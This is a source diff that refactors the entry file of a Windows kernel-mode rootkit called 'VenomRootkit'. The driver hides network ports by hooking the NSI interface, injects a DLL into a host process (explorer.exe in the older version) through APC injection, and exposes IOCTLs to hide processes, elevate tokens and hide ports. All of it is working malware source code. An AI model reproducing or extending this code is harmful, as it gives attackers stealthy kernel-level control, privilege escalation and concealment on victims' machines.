@@ -1,32 +1,29 @@
-#include "UMInjectionHandler.h"
-#include "Venom.h"
+#include "Config.h"
+#include "Capabilities/InjectionCapabilities/APCInjector.h"
+#include "Capabilities/NetworkCapabilites/PortHider.h"
 #include "IoctlHandlers.h"
 #include "Ioctl.h"
-#include "NetworkHandler.h"
+#include "Venom.h"
 
-EX_RUNDOWN_REF ApcHandler::g_rundown_protection;
-
-extern "C" NTSTATUS
-DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
-	UNREFERENCED_PARAMETER(RegistryPath);
+EXTERN_C NTSTATUS
+DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING registryPath) {
+	UNREFERENCED_PARAMETER(registryPath);
 
 	auto status = STATUS_SUCCESS;
-	PDEVICE_OBJECT DeviceObject = nullptr;
-	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");
+	PDEVICE_OBJECT deviceObject = nullptr;
+	UNICODE_STRING symLink = RTL_CONSTANT_STRING(VENOM_SYMLINK);
 
 	bool symLinkCreated = false;
 	do
 	{
-		UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\VenomRootkit");
-		status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
+		UNICODE_STRING deviceName = RTL_CONSTANT_STRING(VENOM_DEVICE_NAME);
+		status = IoCreateDevice(driverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &deviceObject);
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "failed to create device (0x%08X)\n", status));
 			break;
 		}
 
-		status = IoCreateSymbolicLink(&symLink, &devName);
+		status = IoCreateSymbolicLink(&symLink, &deviceName);
 		if (!NT_SUCCESS(status)) {
-			KdPrint((DRIVER_PREFIX "failed to create sym link (0x%08X)\n", status));
 			break;
 		}
 		symLinkCreated = true;
@@ -34,27 +31,32 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	} while (false);
 
 	if (!NT_SUCCESS(status)) {
-		if (symLinkCreated)
+		if (symLinkCreated) {
 			IoDeleteSymbolicLink(&symLink);
-		if (DeviceObject)
-			IoDeleteDevice(DeviceObject);
+		}
+		if (deviceObject) {
+			IoDeleteDevice(deviceObject);
+		}
+
+		return status;
 	}
 
-	DriverObject->DriverUnload = VenomUnload;
-	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
-	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;
+	deviceObject->Flags |= DO_BUFFERED_IO;
 
-	status = NetworkHandler::hookNsi();
+	driverObject->DriverUnload = VenomUnload;
+	driverObject->MajorFunction[IRP_MJ_CREATE] = driverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
+	driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;
+
+	status = PortHider::hide();
 	if (!NT_SUCCESS(status)) {
 		return status;
 	}
 
-	// Inject user mode dll to explorer.exe
-	UNICODE_STRING ProcessName = RTL_CONSTANT_STRING(L"explorer.exe");
-	HANDLE pid = UMInjectionHandler::getProcessId(ProcessName);
-	::ExInitializeRundownProtection(&ApcHandler::g_rundown_protection);
+	auto process = Process(VENOM_HOST_PROCESS);
+	auto apcInjector = APCInjector(process);
 
-	status = UMInjectionHandler::injectDll(HandleToUlong(pid));
+	status = apcInjector.inject();
+
 	if (!NT_SUCCESS(status)) {
 		return status;
 	}
@@ -62,60 +64,49 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	return STATUS_SUCCESS;
 }
 
-NTSTATUS VenomCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+NTSTATUS VenomCreateClose(PDEVICE_OBJECT deviceObject, PIRP irp) {
+	UNREFERENCED_PARAMETER(deviceObject);
 
-	UNREFERENCED_PARAMETER(DeviceObject);
-
-	Irp->IoStatus.Status = STATUS_SUCCESS;
-	Irp->IoStatus.Information = 0;
-	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	irp->IoStatus.Status = STATUS_SUCCESS;
+	irp->IoStatus.Information = 0;
+	IoCompleteRequest(irp, IO_NO_INCREMENT);
 
 	return STATUS_SUCCESS;
 }
 
-NTSTATUS VenomDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
-	auto stack = IoGetCurrentIrpStackLocation(Irp);
+NTSTATUS VenomDeviceControl(PDEVICE_OBJECT deviceObject, PIRP irp) {
+	UNREFERENCED_PARAMETER(deviceObject);
+
+	auto stack = IoGetCurrentIrpStackLocation(irp);
 	NTSTATUS status = STATUS_SUCCESS;
 
 	switch (static_cast<VenomIoctls>(stack->Parameters.DeviceIoControl.IoControlCode)) {
 
 	case VenomIoctls::HideProcces:
-
-		status = IoctlHandlers::HideProcess(Irp);
+		status = IoctlHandlers::hideProcess(irp);
 		break;
-
 	case VenomIoctls::Elevate:
-
-		status = IoctlHandlers::ElevateToken(Irp);
+		status = IoctlHandlers::elevateToken(irp);
 		break;
-
 	case VenomIoctls::HidePort:
-
-		status = IoctlHandlers::HidePort(Irp);
+		status = IoctlHandlers::hidePort(irp);
 		break;
 	default:
-		Irp->IoStatus.Information = 0;
+		irp->IoStatus.Information = 0;
 		status = STATUS_INVALID_DEVICE_REQUEST;
 		break;
 	}
 
-	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	IoCompleteRequest(irp, IO_NO_INCREMENT);
 	return status;
 }
 
-void VenomUnload(PDRIVER_OBJECT DriverObject)
+void VenomUnload(PDRIVER_OBJECT driverObject)
 {
 	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");
 
 	IoDeleteSymbolicLink(&symLink);
-	IoDeleteDevice(DriverObject->DeviceObject);
+	IoDeleteDevice(driverObject->DeviceObject);
 
-	// Unhook NSI.
-	auto status = NetworkHandler::unhookNsi();
-	if (!NT_SUCCESS(status))
-	{
-		DbgPrint("Couldn't unhook NSI");
-	}
-
-	::ExWaitForRundownProtectionRelease(&ApcHandler::g_rundown_protection);
+	PortHider::unhide();
 }
